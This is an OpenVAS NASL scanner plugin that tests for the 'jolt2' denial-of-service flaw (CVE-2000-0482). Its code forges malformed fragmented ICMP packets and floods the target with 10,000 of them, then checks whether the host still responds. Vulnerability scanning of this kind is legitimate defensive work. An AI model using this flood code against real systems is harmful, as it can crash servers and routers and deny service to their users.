# OpenVAS Vulnerability Test
# $Id: jolt2.nasl 8144 2017-12-15 13:19:55Z cfischer $
# Description: jolt2
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The machine (or a gateway on the network path) crashed when
flooded with incorrectly fragmented packets.
This is known as the 'jolt2' denial of service attack.

An attacker may use this flaw to shut down this server or router,
thus preventing you from working properly.";

tag_solution = "contact your operating system vendor for a patch.";

# Note: the original exploit looks buggy. I tried to reproduce it here.

if(description)
{
 script_id(11902);
 script_version("$Revision: 8144 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-15 14:19:55 +0100 (Fri, 15 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1312);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_cve_id("CVE-2000-0482");

 name = "jolt2";
 script_name(name);
 

 script_category(ACT_FLOOD);
  script_tag(name:"qod_type", value:"remote_vul");
 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Denial of Service";
 script_family(family);

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);

 script_exclude_keys("keys/TARGET_IS_IPV6");
 exit(0);
}

#

if(TARGET_IS_IPV6())exit(0);

src = this_host();
id = 0x455;
seq = rand() % 256;

ip = forge_ip_packet(ip_v: 4, ip_hl : 5, ip_tos : 0, ip_len : 20+8+1,
		     ip_id : id, ip_p : IPPROTO_ICMP, ip_ttl : 255,
		     ip_off : 8190, ip_src : src);

icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		 icmp_seq: seq, icmp_id:seq, data: "X");

start_denial();

send_packet(icmp, pcap_active: 0) x 10000;

alive = end_denial();
if(!alive)
{
	security_message();
	set_kb_item( name:"Host/dead", value:TRUE );
}
